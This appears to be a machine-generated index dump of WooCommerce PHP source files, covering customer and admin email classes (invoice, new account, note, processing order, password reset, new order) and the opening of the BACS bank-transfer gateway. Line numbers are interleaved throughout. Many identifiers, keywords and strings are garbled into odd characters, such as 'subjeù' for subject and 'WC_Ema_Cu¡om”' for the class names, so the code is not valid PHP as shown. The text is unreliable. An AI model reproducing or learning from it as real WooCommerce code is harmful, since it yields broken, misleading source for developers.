( 'Subject (downloadable)', 'woocommerce' ),

162 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'DeçuÉ tØ<code>%s</code>', 'woocomm”û' ), 
$this
->
subjeù_dowÆßdabË
 ),

166 'h—dšg_dowÆßdabË' => 
	`¬¿y
(

167 't™Ë' => 
	`__
( 'Email Heading (downloadable)', 'woocommerce' ),

169 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'DeçuÉ tØ<code>%s</code>', 'woocomm”û' ), 
$this
->
h—dšg_dowÆßdabË
 ),

173 'ema_ty³' => 
	`¬¿y
(

174 't™Ë' => 
	`__
( 'Emailype', 'woocommerce' ),

176 'desütiÚ' => 
	`__
( 'Choose which format ofƒmailo send.', 'woocommerce' ),

179 'İtiÚs' => 
	`¬¿y
(

180 '¶aš' => 
	`__
( 'Plainext', 'woocommerce' ),

181 'html' => 
	`__
( 'HTML', 'woocommerce' ),

182 'muÉ¬t' => 
	`__
( 'Multipart', 'woocommerce' ),

186 
	}
}

189 
	g’dif
;

191  
Ãw
 
WC_Ema_Cu¡om”_Com¶‘ed_Ord”
();

	@includes/emails/class-wc-email-customer-invoice.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WC_Email_Customer_Invoice' ) ) :

18 şas 
	cWC_Ema_Cu¡om”_Invoiû
 
ex‹nds
 
WC_Ema
 {

20 
v¬
 
$fšd
;

21 
v¬
 
	m$»¶aû
;

26 
funùiÚ
 
	$__cÚ¡ruù
() {

28 
$this
->
id
 = 'customer_invoice';

29 
$this
->
t™Ë
 = 
	`__
( 'Customer invoice', 'woocommerce' );

30 
$this
->
desütiÚ
 = 
	`__
( 'Customer invoiceƒmails can be sentohe user containing order info‡nd…ayment†inks.', 'woocommerce' );

32 
$this
->
‹m¶©e_html
 = 'emails/customer-invoice.php';

33 
$this
->
‹m¶©e_¶aš
 = 'emails/plain/customer-invoice.php';

35 
$this
->
subjeù
 = 
	`__
( 'Invoice for order {order_number} from {order_date}', 'woocommerce');

36 
$this
->
h—dšg
 = 
	`__
( 'Invoice for order {order_number}', 'woocommerce');

38 
$this
->
subjeù_·id
 = 
	`__
( 'Your {site_title} order from {order_date}', 'woocommerce');

39 
$this
->
h—dšg_·id
 = 
	`__
( 'Order {order_number} details', 'woocommerce');

42 
·»Á
::
	`__cÚ¡ruù
();

44 
$this
->
h—dšg_·id
 = $this->
	`g‘_İtiÚ
( 'heading_paid', $this->heading_paid );

45 
$this
->
subjeù_·id
 = $this->
	`g‘_İtiÚ
( 'subject_paid', $this->subject_paid );

54 
funùiÚ
 
	$Œigg”
Ğ
$Üd”
 ) {

56 iàĞ! 
	`is_objeù
Ğ
$Üd”
 ) ) {

57 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
	`absšt
( $order ) );

60 iàĞ
$Üd”
 ) {

61 
$this
->
objeù
 = 
$Üd”
;

62 
$this
->
»c›Á
 = $this->
objeù
->
blšg_ema
;

64 
$this
->
fšd
[] = '{order_date}';

65 
$this
->
»¶aû
[] = 
	`d©e_i18n
Ğ
	`wc_d©e_fÜm©
(), 
	`¡¹Ùime
Ğ$this->
objeù
->
Üd”_d©e
 ) );

67 
$this
->
fšd
[] = '{order_number}';

68 
$this
->
»¶aû
[] = $this->
objeù
->
	`g‘_Üd”_numb”
();

71 iàĞ! 
$this
->
	`g‘_»c›Á
() )

74 
$this
->
	`£nd
Ğ$this->
	`g‘_»c›Á
(), $this->
	`g‘_subjeù
(), $this->
	`g‘_cÚ‹Á
(), $this->
	`g‘_h—d”s
(), $this->
	`g‘_©chm’ts
() );

75 
	}
}

83 
funùiÚ
 
	$g‘_subjeù
() {

84 iàĞ
$this
->
objeù
->
¡©us
 == 'processing' || $this->object->status == 'completed' )

85  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_subjeù_cu¡om”_švoiû_·id', 
$this
->
	`fÜm©_¡ršg
Ğ$this->
subjeù_·id
 ), $this->
objeù
 );

87  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_subjeù_cu¡om”_švoiû', 
$this
->
	`fÜm©_¡ršg
Ğ$this->
subjeù
 ), $this->
objeù
 );

88 
	}
}

96 
funùiÚ
 
	$g‘_h—dšg
() {

97 iàĞ
$this
->
objeù
->
¡©us
 == 'processing' || $this->object->status == 'completed' )

98  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_h—dšg_cu¡om”_švoiû_·id', 
$this
->
	`fÜm©_¡ršg
Ğ$this->
h—dšg_·id
 ), $this->
objeù
 );

100  
	`­¶y_f‹rs
Ğ'woocomm”û_ema_h—dšg_cu¡om”_švoiû', 
$this
->
	`fÜm©_¡ršg
Ğ$this->
h—dšg
 ), $this->
objeù
 );

101 
	}
}

109 
funùiÚ
 
	$g‘_cÚ‹Á_html
() {

110 
	`ob_¡¬t
();

111 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_html
, 
	`¬¿y
(

112 'Üd”' => 
$this
->
objeù
,

113 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

114 '£Á_to_admš' => 
çl£
,

115 '¶aš_‹xt' => 
çl£


117  
	`ob_g‘_ş—n
();

118 
	}
}

126 
funùiÚ
 
	$g‘_cÚ‹Á_¶aš
() {

127 
	`ob_¡¬t
();

128 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_¶aš
, 
	`¬¿y
(

129 'Üd”' => 
$this
->
objeù
,

130 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

131 '£Á_to_admš' => 
çl£
,

132 '¶aš_‹xt' => 
Œue


134  
	`ob_g‘_ş—n
();

135 
	}
}

143 
funùiÚ
 
	$š™_fÜm_f›lds
() {

144 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

145 'subjeù' => 
	`¬¿y
(

146 't™Ë' => 
	`__
( 'Email subject', 'woocommerce' ),

148 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'DeçuÉ tØ<code>%s</code>', 'woocomm”û' ), 
$this
->
subjeù
 ),

152 'h—dšg' => 
	`¬¿y
(

153 't™Ë' => 
	`__
( 'Email heading', 'woocommerce' ),

155 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'DeçuÉ tØ<code>%s</code>', 'woocomm”û' ), 
$this
->
h—dšg
 ),

159 'subjeù_·id' => 
	`¬¿y
(

160 't™Ë' => 
	`__
( 'Email subject (paid)', 'woocommerce' ),

162 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'DeçuÉ tØ<code>%s</code>', 'woocomm”û' ), 
$this
->
subjeù_·id
 ),

166 'h—dšg_·id' => 
	`¬¿y
(

167 't™Ë' => 
	`__
( 'Email heading (paid)', 'woocommerce' ),

169 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'DeçuÉ tØ<code>%s</code>', 'woocomm”û' ), 
$this
->
h—dšg_·id
 ),

173 'ema_ty³' => 
	`¬¿y
(

174 't™Ë' => 
	`__
( 'Emailype', 'woocommerce' ),

176 'desütiÚ' => 
	`__
( 'Choose which format ofƒmailo send.', 'woocommerce' ),

179 'İtiÚs' => 
	`¬¿y
(

180 '¶aš' => 
	`__
( 'Plainext', 'woocommerce' ),

181 'html' => 
	`__
( 'HTML', 'woocommerce' ),

182 'muÉ¬t' => 
	`__
( 'Multipart', 'woocommerce' ),

186 
	}
}

189 
	g’dif
;

191  
Ãw
 
WC_Ema_Cu¡om”_Invoiû
();

	@includes/emails/class-wc-email-customer-new-account.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WC_Email_Customer_New_Account' ) ) :

18 şas 
	cWC_Ema_Cu¡om”_New_AccouÁ
 
ex‹nds
 
WC_Ema
 {

20 
v¬
 
$u£r_logš
;

21 
v¬
 
	m$u£r_ema
;

22 
v¬
 
	m$u£r_·ss
;

30 
funùiÚ
 
	$__cÚ¡ruù
() {

32 
$this
->
id
 = 'customer_new_account';

33 
$this
->
t™Ë
 = 
	`__
( 'New‡ccount', 'woocommerce' );

34 
$this
->
desütiÚ
 = 
	`__
( 'Customer‚ew‡ccountƒmails‡re sent when‡ customer signs up viahe checkout or My Account…age.', 'woocommerce' );

36 
$this
->
‹m¶©e_html
 = 'emails/customer-new-account.php';

37 
$this
->
‹m¶©e_¶aš
 = 'emails/plain/customer-new-account.php';

39 
$this
->
subjeù
 = 
	`__
( 'Your‡ccount on {site_title}', 'woocommerce');

40 
$this
->
h—dšg
 = 
	`__
( 'Welcomeo {site_title}', 'woocommerce');

43 
·»Á
::
	`__cÚ¡ruù
();

52 
funùiÚ
 
	`Œigg”
Ğ
$u£r_id
, 
$u£r_·ss
 = '', 
$·sswÜd_g’”©ed
 = 
çl£
 ) {

54 iàĞ
$u£r_id
 ) {

55 
$this
->
objeù
 = 
Ãw
 
	`WP_U£r
Ğ
$u£r_id
 );

57 
$this
->
u£r_·ss
 = 
$u£r_·ss
;

58 
$this
->
u£r_logš
 = 
	`¡r¦ashes
Ğ$this->
objeù
->user_login );

59 
$this
->
u£r_ema
 = 
	`¡r¦ashes
Ğ$this->
objeù
->user_email );

60 
$this
->
»c›Á
 = $this->
u£r_ema
;

61 
$this
->
·sswÜd_g’”©ed
 = 
$·sswÜd_g’”©ed
;

64 iàĞ! 
$this
->
	`is_’abËd
(è|| ! $this->
	`g‘_»c›Á
() )

67 
$this
->
	`£nd
Ğ$this->
	`g‘_»c›Á
(), $this->
	`g‘_subjeù
(), $this->
	`g‘_cÚ‹Á
(), $this->
	`g‘_h—d”s
(), $this->
	`g‘_©chm’ts
() );

68 
	}
}

76 
funùiÚ
 
	$g‘_cÚ‹Á_html
() {

77 
	`ob_¡¬t
();

78 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_html
, 
	`¬¿y
(

79 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

80 'u£r_logš' => 
$this
->
u£r_logš
,

81 'u£r_·ss' => 
$this
->
u£r_·ss
,

82 'blogÇme' => 
$this
->
	`g‘_blogÇme
(),

83 '·sswÜd_g’”©ed' => 
$this
->
·sswÜd_g’”©ed
,

84 '£Á_to_admš' => 
çl£
,

85 '¶aš_‹xt' => 
çl£


87  
	`ob_g‘_ş—n
();

88 
	}
}

96 
funùiÚ
 
	$g‘_cÚ‹Á_¶aš
() {

97 
	`ob_¡¬t
();

98 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_¶aš
, 
	`¬¿y
(

99 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

100 'u£r_logš' => 
$this
->
u£r_logš
,

101 'u£r_·ss' => 
$this
->
u£r_·ss
,

102 'blogÇme' => 
$this
->
	`g‘_blogÇme
(),

103 '·sswÜd_g’”©ed' => 
$this
->
·sswÜd_g’”©ed
,

104 '£Á_to_admš' => 
çl£
,

105 '¶aš_‹xt' => 
Œue


107  
	`ob_g‘_ş—n
();

108 
	}
}

111 
	g’dif
;

113  
Ãw
 
WC_Ema_Cu¡om”_New_AccouÁ
();

	@includes/emails/class-wc-email-customer-note.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WC_Email_Customer_Note' ) ) :

18 şas 
	cWC_Ema_Cu¡om”_NÙe
 
ex‹nds
 
WC_Ema
 {

20 
v¬
 
$cu¡om”_nÙe
;

28 
funùiÚ
 
	$__cÚ¡ruù
() {

30 
$this
->
id
 = 'customer_note';

31 
$this
->
t™Ë
 = 
	`__
( 'Customer‚ote', 'woocommerce' );

32 
$this
->
desütiÚ
 = 
	`__
( 'Customer‚oteƒmails‡re sent when you‡dd‡‚oteo‡n order.', 'woocommerce' );

34 
$this
->
‹m¶©e_html
 = 'emails/customer-note.php';

35 
$this
->
‹m¶©e_¶aš
 = 'emails/plain/customer-note.php';

37 
$this
->
subjeù
 = 
	`__
( 'Note‡ddedo your {site_title} order from {order_date}', 'woocommerce');

38 
$this
->
h—dšg
 = 
	`__
( 'A‚ote has been‡ddedo your order', 'woocommerce');

41 
	`add_aùiÚ
Ğ'woocomm”û_Ãw_cu¡om”_nÙe_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ) );

44 
·»Á
::
	`__cÚ¡ruù
();

53 
funùiÚ
 
	$Œigg”
Ğ
$¬gs
 ) {

55 iàĞ
$¬gs
 ) {

57 
$deçuÉs
 = 
	`¬¿y
(

62 
$¬gs
 = 
	`wp_·r£_¬gs
Ğ$¬gs, 
$deçuÉs
 );

64 
	`exŒaù
Ğ
$¬gs
 );

66 
$this
->
objeù
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

67 
$this
->
»c›Á
 = $this->
objeù
->
blšg_ema
;

68 
$this
->
cu¡om”_nÙe
 = 
$cu¡om”_nÙe
;

70 
$this
->
fšd
[] = '{order_date}';

71 
$this
->
»¶aû
[] = 
	`d©e_i18n
Ğ
	`woocomm”û_d©e_fÜm©
(), 
	`¡¹Ùime
Ğ$this->
objeù
->
Üd”_d©e
 ) );

73 
$this
->
fšd
[] = '{order_number}';

74 
$this
->
»¶aû
[] = $this->
objeù
->
	`g‘_Üd”_numb”
();

77 iàĞ! 
$this
->
	`is_’abËd
(è|| ! $this->
	`g‘_»c›Á
() )

80 
$this
->
	`£nd
Ğ$this->
	`g‘_»c›Á
(), $this->
	`g‘_subjeù
(), $this->
	`g‘_cÚ‹Á
(), $this->
	`g‘_h—d”s
(), $this->
	`g‘_©chm’ts
() );

81 
	}
}

89 
funùiÚ
 
	$g‘_cÚ‹Á_html
() {

90 
	`ob_¡¬t
();

91 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_html
, 
	`¬¿y
(

92 'Üd”' => 
$this
->
objeù
,

93 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

94 'cu¡om”_nÙe' => 
$this
->
cu¡om”_nÙe
,

95 '£Á_to_admš' => 
çl£
,

96 '¶aš_‹xt' => 
çl£


98  
	`ob_g‘_ş—n
();

99 
	}
}

107 
funùiÚ
 
	$g‘_cÚ‹Á_¶aš
() {

108 
	`ob_¡¬t
();

109 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_¶aš
, 
	`¬¿y
(

110 'Üd”' => 
$this
->
objeù
,

111 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

112 'cu¡om”_nÙe' => 
$this
->
cu¡om”_nÙe
,

113 '£Á_to_admš' => 
çl£
,

114 '¶aš_‹xt' => 
Œue


116  
	`ob_g‘_ş—n
();

117 
	}
}

120 
	g’dif
;

122  
Ãw
 
WC_Ema_Cu¡om”_NÙe
();

	@includes/emails/class-wc-email-customer-processing-order.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WC_Email_Customer_Processing_Order' ) ) :

18 şas 
	cWC_Ema_Cu¡om”_Proûssšg_Ord”
 
ex‹nds
 
WC_Ema
 {

23 
funùiÚ
 
	$__cÚ¡ruù
() {

25 
$this
->
id
 = 'customer_processing_order';

26 
$this
->
t™Ë
 = 
	`__
( 'Processing order', 'woocommerce' );

27 
$this
->
desütiÚ
 = 
	`__
( 'This is‡n order‚otification sentohe customer‡fter…ayment containing order details.', 'woocommerce' );

29 
$this
->
h—dšg
 = 
	`__
( 'Thank you for your order', 'woocommerce' );

30 
$this
->
subjeù
 = 
	`__
( 'Your {site_title} order„eceipt from {order_date}', 'woocommerce' );

32 
$this
->
‹m¶©e_html
 = 'emails/customer-processing-order.php';

33 
$this
->
‹m¶©e_¶aš
 = 'emails/plain/customer-processing-order.php';

36 
	`add_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_³ndšg_to_´oûssšg_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ) );

37 
	`add_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_³ndšg_to_Ú-hŞd_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ) );

40 
·»Á
::
	`__cÚ¡ruù
();

49 
funùiÚ
 
	$Œigg”
Ğ
$Üd”_id
 ) {

51 iàĞ
$Üd”_id
 ) {

52 
$this
->
objeù
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

53 
$this
->
»c›Á
 = $this->
objeù
->
blšg_ema
;

55 
$this
->
fšd
[] = '{order_date}';

56 
$this
->
»¶aû
[] = 
	`d©e_i18n
Ğ
	`wc_d©e_fÜm©
(), 
	`¡¹Ùime
Ğ$this->
objeù
->
Üd”_d©e
 ) );

58 
$this
->
fšd
[] = '{order_number}';

59 
$this
->
»¶aû
[] = $this->
objeù
->
	`g‘_Üd”_numb”
();

62 iàĞ! 
$this
->
	`is_’abËd
(è|| ! $this->
	`g‘_»c›Á
() )

65 
$this
->
	`£nd
Ğ$this->
	`g‘_»c›Á
(), $this->
	`g‘_subjeù
(), $this->
	`g‘_cÚ‹Á
(), $this->
	`g‘_h—d”s
(), $this->
	`g‘_©chm’ts
() );

66 
	}
}

74 
funùiÚ
 
	$g‘_cÚ‹Á_html
() {

75 
	`ob_¡¬t
();

76 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_html
, 
	`¬¿y
(

77 'Üd”' => 
$this
->
objeù
,

78 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

79 '£Á_to_admš' => 
çl£
,

80 '¶aš_‹xt' => 
çl£


82  
	`ob_g‘_ş—n
();

83 
	}
}

91 
funùiÚ
 
	$g‘_cÚ‹Á_¶aš
() {

92 
	`ob_¡¬t
();

93 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_¶aš
, 
	`¬¿y
(

94 'Üd”' => 
$this
->
objeù
,

95 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

96 '£Á_to_admš' => 
çl£
,

97 '¶aš_‹xt' => 
Œue


99  
	`ob_g‘_ş—n
();

100 
	}
}

103 
	g’dif
;

105  
Ãw
 
WC_Ema_Cu¡om”_Proûssšg_Ord”
();

	@includes/emails/class-wc-email-customer-reset-password.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WC_Email_Customer_Reset_Password' ) ) :

18 şas 
	cWC_Ema_Cu¡om”_Re£t_PasswÜd
 
ex‹nds
 
WC_Ema
 {

21 
v¬
 
$u£r_logš
;

24 
v¬
 
	m$u£r_ema
;

27 
v¬
 
	m$»£t_key
;

35 
funùiÚ
 
	$__cÚ¡ruù
() {

37 
$this
->
id
 = 'customer_reset_password';

38 
$this
->
t™Ë
 = 
	`__
( 'Reset…assword', 'woocommerce' );

39 
$this
->
desütiÚ
 = 
	`__
( 'Customer„eset…asswordƒmails‡re sent when‡ customer„esetsheir…assword.', 'woocommerce' );

41 
$this
->
‹m¶©e_html
 = 'emails/customer-reset-password.php';

42 
$this
->
‹m¶©e_¶aš
 = 'emails/plain/customer-reset-password.php';

44 
$this
->
subjeù
 = 
	`__
( 'Password Reset for {site_title}', 'woocommerce');

45 
$this
->
h—dšg
 = 
	`__
( 'Password Reset Instructions', 'woocommerce');

48 
	`add_aùiÚ
Ğ'woocomm”û_»£t_·sswÜd_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ), 10, 2 );

51 
·»Á
::
	`__cÚ¡ruù
();

60 
funùiÚ
 
	`Œigg”
Ğ
$u£r_logš
 = '', 
$»£t_key
 = '' ) {

61 iàĞ
$u£r_logš
 && 
$»£t_key
 ) {

62 
$this
->
objeù
 = 
	`g‘_u£r_by
Ğ'logš', 
$u£r_logš
 );

64 
$this
->
u£r_logš
 = 
$u£r_logš
;

65 
$this
->
»£t_key
 = 
$»£t_key
;

66 
$this
->
u£r_ema
 = 
	`¡r¦ashes
Ğ$this->
objeù
->user_email );

67 
$this
->
»c›Á
 = $this->
u£r_ema
;

70 iàĞ! 
$this
->
	`is_’abËd
(è|| ! $this->
	`g‘_»c›Á
() )

73 
$this
->
	`£nd
Ğ$this->
	`g‘_»c›Á
(), $this->
	`g‘_subjeù
(), $this->
	`g‘_cÚ‹Á
(), $this->
	`g‘_h—d”s
(), $this->
	`g‘_©chm’ts
() );

75 
	}
}

83 
funùiÚ
 
	$g‘_cÚ‹Á_html
() {

84 
	`ob_¡¬t
();

85 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_html
, 
	`¬¿y
(

86 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

87 'u£r_logš' => 
$this
->
u£r_logš
,

88 '»£t_key' => 
$this
->
»£t_key
,

89 'blogÇme' => 
$this
->
	`g‘_blogÇme
(),

90 '£Á_to_admš' => 
çl£
,

91 '¶aš_‹xt' => 
çl£


93  
	`ob_g‘_ş—n
();

94 
	}
}

102 
funùiÚ
 
	$g‘_cÚ‹Á_¶aš
() {

103 
	`ob_¡¬t
();

104 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_¶aš
, 
	`¬¿y
(

105 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

106 'u£r_logš' => 
$this
->
u£r_logš
,

107 '»£t_key' => 
$this
->
»£t_key
,

108 'blogÇme' => 
$this
->
	`g‘_blogÇme
(),

109 '£Á_to_admš' => 
çl£
,

110 '¶aš_‹xt' => 
Œue


112  
	`ob_g‘_ş—n
();

113 
	}
}

116 
	g’dif
;

118  
Ãw
 
WC_Ema_Cu¡om”_Re£t_PasswÜd
();

	@includes/emails/class-wc-email-new-order.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

5 iàĞ! 
şass_exi¡s
( 'WC_Email_New_Order' ) ) :

18 şas 
	cWC_Ema_New_Ord”
 
ex‹nds
 
WC_Ema
 {

23 
funùiÚ
 
	$__cÚ¡ruù
() {

25 
$this
->
id
 = 'new_order';

26 
$this
->
t™Ë
 = 
	`__
( 'New order', 'woocommerce' );

27 
$this
->
desütiÚ
 = 
	`__
( 'New orderƒmails‡re sent when‡n order is„eceived.', 'woocommerce' );

29 
$this
->
h—dšg
 = 
	`__
( 'New customer order', 'woocommerce' );

30 
$this
->
subjeù
 = 
	`__
( '[{site_title}] New customer order ({order_number}) - {order_date}', 'woocommerce' );

32 
$this
->
‹m¶©e_html
 = 'emails/admin-new-order.php';

33 
$this
->
‹m¶©e_¶aš
 = 'emails/plain/admin-new-order.php';

36 
	`add_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_³ndšg_to_´oûssšg_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ) );

37 
	`add_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_³ndšg_to_com¶‘ed_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ) );

38 
	`add_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_³ndšg_to_Ú-hŞd_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ) );

39 
	`add_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_çed_to_´oûssšg_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ) );

40 
	`add_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_çed_to_com¶‘ed_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ) );

41 
	`add_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_çed_to_Ú-hŞd_nÙifiÿtiÚ', 
	`¬¿y
Ğ
$this
, 'trigger' ) );

44 
·»Á
::
	`__cÚ¡ruù
();

47 
$this
->
»c›Á
 = $this->
	`g‘_İtiÚ
( 'recipient' );

49 iàĞ! 
$this
->
»c›Á
 )

50 
$this
->
»c›Á
 = 
	`g‘_İtiÚ
( 'admin_email' );

59 
funùiÚ
 
	$Œigg”
Ğ
$Üd”_id
 ) {

61 iàĞ
$Üd”_id
 ) {

62 
$this
->
objeù
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

64 
$this
->
fšd
[] = '{order_date}';

65 
$this
->
»¶aû
[] = 
	`d©e_i18n
Ğ
	`wc_d©e_fÜm©
(), 
	`¡¹Ùime
Ğ$this->
objeù
->
Üd”_d©e
 ) );

67 
$this
->
fšd
[] = '{order_number}';

68 
$this
->
»¶aû
[] = $this->
objeù
->
	`g‘_Üd”_numb”
();

71 iàĞ! 
$this
->
	`is_’abËd
(è|| ! $this->
	`g‘_»c›Á
() )

74 
$this
->
	`£nd
Ğ$this->
	`g‘_»c›Á
(), $this->
	`g‘_subjeù
(), $this->
	`g‘_cÚ‹Á
(), $this->
	`g‘_h—d”s
(), $this->
	`g‘_©chm’ts
() );

75 
	}
}

83 
funùiÚ
 
	$g‘_cÚ‹Á_html
() {

84 
	`ob_¡¬t
();

85 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_html
, 
	`¬¿y
(

86 'Üd”' => 
$this
->
objeù
,

87 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

88 '£Á_to_admš' => 
Œue
,

89 '¶aš_‹xt' => 
çl£


91  
	`ob_g‘_ş—n
();

92 
	}
}

100 
funùiÚ
 
	$g‘_cÚ‹Á_¶aš
() {

101 
	`ob_¡¬t
();

102 
	`wc_g‘_‹m¶©e
Ğ
$this
->
‹m¶©e_¶aš
, 
	`¬¿y
(

103 'Üd”' => 
$this
->
objeù
,

104 'ema_h—dšg' => 
$this
->
	`g‘_h—dšg
(),

105 '£Á_to_admš' => 
Œue
,

106 '¶aš_‹xt' => 
Œue


108  
	`ob_g‘_ş—n
();

109 
	}
}

117 
funùiÚ
 
	$š™_fÜm_f›lds
() {

118 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

119 '’abËd' => 
	`¬¿y
(

120 't™Ë' => 
	`__
( 'Enable/Disable', 'woocommerce' ),

122 'Ïb–' => 
	`__
( 'Enablehisƒmail‚otification', 'woocommerce' ),

125 '»c›Á' => 
	`¬¿y
(

126 't™Ë' => 
	`__
( 'Recipient(s)', 'woocommerce' ),

128 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'EÁ”„ec›Á (comm¨£·¿‹dèfÜhi ema. DeçuÉ tØ<code>%s</code>.', 'woocomm”û' ), 
	`esc_©Œ
Ğ
	`g‘_İtiÚ
('admin_email') ) ),

132 'subjeù' => 
	`¬¿y
(

133 't™Ë' => 
	`__
( 'Subject', 'woocommerce' ),

135 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'Thi cÚŒŞ thema subjeù†še. L—vbÏnkØu£hdeçuÉ subjeù: <code>%s</code>.', 'woocomm”û' ), 
$this
->
subjeù
 ),

139 'h—dšg' => 
	`¬¿y
(

140 't™Ë' => 
	`__
( 'Email Heading', 'woocommerce' ),

142 'desütiÚ' => 
	`¥rštf
Ğ
	`__
Ğ'Thi cÚŒŞ thmaš h—dšg cÚšed w™hšhema‚ÙifiÿtiÚ. L—vbÏnkØu£hdeçuÉ h—dšg: <code>%s</code>.', 'woocomm”û' ), 
$this
->
h—dšg
 ),

146 'ema_ty³' => 
	`¬¿y
(

147 't™Ë' => 
	`__
( 'Emailype', 'woocommerce' ),

149 'desütiÚ' => 
	`__
( 'Choose which format ofƒmailo send.', 'woocommerce' ),

152 'İtiÚs' => 
	`¬¿y
(

153 '¶aš' => 
	`__
( 'Plainext', 'woocommerce' ),

154 'html' => 
	`__
( 'HTML', 'woocommerce' ),

155 'muÉ¬t' => 
	`__
( 'Multipart', 'woocommerce' ),

159 
	}
}

162 
	g’dif
;

164  
Ãw
 
WC_Ema_New_Ord”
();

	@includes/gateways/bacs/class-wc-gateway-bacs.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_G©eway_BACS
 
ex‹nds
 
	mWC_Paym’t_G©eway
 {

21 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

22 
$this
->
id
 = 'bacs';

23 
$this
->
icÚ
 = 
	`­¶y_f‹rs
('woocommerce_bacs_icon', '');

24 
$this
->
has_f›lds
 = 
çl£
;

25 
$this
->
m‘hod_t™Ë
 = 
	`__
( 'BACS', 'woocommerce' );

26 
$this
->
m‘hod_desütiÚ
 = 
	`__
( 'Allows…ayments by BACS, more commonly known‡s direct bank/wireransfer.', 'woocommerce' );

29 
$this
->
	`š™_fÜm_f›lds
();

30 
$this
->
	`š™_£‰šgs
();

33 
$this
->
t™Ë
 = $this->
	`g‘_İtiÚ
( 'title' );

34 
$this
->
desütiÚ
 = $this->
	`g‘_İtiÚ
( 'description' );

35 
$this
->
š¡ruùiÚs
 = $this->
	`g‘_İtiÚ
Ğ'š¡ruùiÚs', $this->
desütiÚ
 );

38 
$this
->
accouÁ_d‘as
 = 
	`g‘_İtiÚ
( 'woocommerce_bacs_accounts',

39 
	`¬¿y
(

40 
	`¬¿y
(

41 'accouÁ_Çme' => 
$this
->
	`g‘_İtiÚ
( 'account_name' ),

42 'accouÁ_numb”' => 
$this
->
	`g‘_İtiÚ
( 'account_number' ),

43 'sÜt_code' => 
$this
->
	`g‘_İtiÚ
( 'sort_code' ),

44 'bªk_Çme' => 
$this
->
	`g‘_İtiÚ
( 'bank_name' ),

45 'ibª' => 
$this
->
	`g‘_İtiÚ
( 'iban' ),

46 'bic' => 
$this
->
	`g‘_İtiÚ
( 'bic' )

52 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_·ym’t_g©eways_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

53 
	`add_aùiÚ
